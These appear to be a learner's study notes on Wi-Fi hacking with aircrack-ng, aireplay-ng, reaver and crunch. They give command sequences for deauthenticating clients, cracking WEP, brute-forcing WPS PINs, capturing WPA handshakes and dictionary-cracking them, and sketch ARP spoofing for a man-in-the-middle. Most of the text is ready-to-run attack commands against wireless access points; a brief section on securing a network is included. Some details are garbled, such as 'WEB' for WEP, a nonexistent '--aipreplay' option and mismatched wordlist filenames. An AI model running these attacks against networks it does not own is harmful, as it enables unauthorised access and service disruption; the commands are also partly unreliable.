Deauthentication Attack:
	Change MAC address to the MAC address of the client.
	Tell routher I want to disconnect. 
	Then client disconnects.

	Then pretend to be the router by changing MAC address to the router.
	Tell the client I am going to disconnect you.
	
	open two terminals and run:

	> airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 wlan0
	> aireplay-ng --deauth 10 -a C8:0E:14:BE:35:71 -c 9C:B6:D0:EB:C8:89 wlan0
		- it didn't work with my Ubuntu-PC.
	> sudo aireplay-ng -0 10 -a C8:0E:14:BE:35:71 -c C0:EE:FB:2D:6C:AA wlan0
		- it works with my Android Phone.


Cracking WEB Encryption			(I don't have WEB so this is untested)
	IV is 24 bits 	
	keyStream = IV + Password.
	KeyStream + Data = Cipher.
	The IV is small and sent in plaintext.
	IV will be repeated on busy networks.

	1. Capture a large number of packet/IVs.
	> airodump-ng --bssid C8:0E:14:BE:35:71 --channel 1 --write basic_web wlan0

	2. Analyze data and crack the key.
	> aircrack-ng basic_web-01.cap -> KEY FOUND: SECRET.

	if password was found but you can't see the ASCII password then
	remove colons in the HEX password and use it instead.


FAKE Authentification Attack
	If network is not busy WEB cracking is slow.
	Force AP to generate new IVs.
	
	1. Capture a packets with IVs.
	> airodump-ng --bssid C8:0E:14:BE:35:71 --channel 1 --write arpreplay wlan0

	2. Ask router to authenticate me.
	> aireplay-ng --fakeauth 0 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0

	This send 1 package with an IV. We could do this many times.


ARP Request Replay Attack		
(Untested as I do not have WEB) (WARNING DO NOT COPY COMMAND FROM THIS SECTION)
	Wait for an ARP packet.
	Capture it and replay it.
	Router is then forced to generate new packages with new IV's.
	Keep doing this till we have enough IVs to crack the key.
	
	1. Capture a packets with IVs.
	   I think this here makes the Network Adapter focus this network on this channel,
	   so the 2. command with work.

	> sudo airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 wlan0
	
	2. Ask router to authenticate me and thereby associate yourself with the network.
	> aireplay-ng --fakeauth 0 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0
		
	3. Run the AIP replay attack.
	> aireplay-ng --aipreplay -b C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0

	4. Analyze data and crack the key.
	> aircrack-ng arpreplay-01.cap -> KEY FOUND: SECRET.


WPA and WPA2 Cracking through WPS		
	Sometimes they use WPS and that is easy crack.
	The attack works if the router is not using Push-Button-Authentification.

	1. Look for networks that use WPS:
	> wash -i wlan0					(not working)

	2. Ask router to authenticate me. 
	   We do this so the router will not associate us and not ignore our messages.
	   We want to associate with the target network every 30 seconds.

	> sudo aireplay-ng --fakeauth 30 -a C8:0E:14:BE:35:71 -h 00:11:22:33:44:55 wlan0

	3. Run reaver that bruteforce the PIN.
	   reaver is a script I downloaded - it is located in /Downloads
	   -vvv for information
	   --no-associate: we are already doing this.

	> sudo ./reaver --bssid C8:0E:14:BE:35:71 --channel 60 --interface wlan0 -vvv --no-associate

	[+] Switching wlan0 to channel 60
	[+] Waiting for beacon from C8:0E:14:BE:35:71
	[+] Associated with C8:0E:14:BE:35:71 (ESSID: latte_macchiato)
	[+] Trying pin "12345670"
	[+] Sending EAPOL START request                                                                                    
	[!] WARNING: Receive timeout occurred 
         
	My Router has Push-Button_Authentification and therefore I get a timeout.
	
WPA and WPA2 Cracking by capturing handshake
	The only packages that contain useful information are the handshake packages.

	1. capture data from the target network
	> sudo airodump-ng --band a --bssid C8:0E:14:BE:35:71 --channel 60 --write wpa_handskake wlan0 
         
	2. Sit down and wait for the handshake to be captured or do a deauthentification attack.
	   - Remember to look for probes to see if you got a handshake.
	   - Or it is when they is something in the Notes column.

	> sudo aireplay-ng -0 4 -a C8:0E:14:BE:35:71 -c C0:EE:FB:2D:6C:AA wlan0

Creating Wordlist
	Syntax:
	> crunch min max characters -t pattern -o filename
	Example:
	> crunch 6 8 123abc$ -o wordlist -t a@@@@@b
	
	the -p option is for non repeating passwords.
	
	> crunch 6 8 adc12 -o test.txt
	gives all posible combination

Cracking WPA and WPA2
	Requires a wordlist that includes the password.
	
	kali has wordlists in /usr/share/wordlists

	I have generated my own wordlist called test.txt

	> sudo aircrack-ng wpa_handshake-01.cap -w text.txt

Securing Network From Hackers
	1. Dont use WEP	
	2. On WPA/WPA2 
		- If  WPS is enabled and then it is relatively quick to hack.
			- Disable WPS.
		- If WPS in not enabled then the only known way to hack is using a dictionary attack.
			- Use a complex password, small, capitcal letters, symbols and numbers.

Man-In-The-Middle Attack
	ARP SPOOFING
		Information flow: Victim -> Hacker -> Access Point --> Internet.
		In order for device to communicate inside the same network is carried out using the MAC.
		ARP: Address Resolution Protocol.
			Map IP address of a macine to it's MAC address.
			Broadcast to all devices on network: WHO has IP 10.0.2.6?
			All devices ignore message except the person with the right IP who will send its MAC.
			Each computer has an ARP table.
			>sudo arp -a

		* Send ARP Respone to Access point: I am the victim.
		* Send ART Response to Victim: I am the Access point.

		It is insecure because:
			Cliets accept respone even when they didn't send a request.
			There is no form of verification.
